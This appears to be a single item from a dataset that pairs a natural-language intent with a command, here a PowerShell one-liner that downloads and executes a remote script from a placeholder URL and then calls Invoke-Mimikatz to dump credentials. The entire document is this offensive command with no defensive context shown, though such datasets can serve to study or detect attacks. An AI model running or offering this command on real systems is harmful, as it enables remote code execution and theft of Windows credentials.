# Natural language intent:
# Download and execute a remote script, then use Mimikatz to dump credentials.

IEX (New-Object Net.WebClient).DownloadString('${remote_script}'); Invoke-Mimikatz -DumpCreds
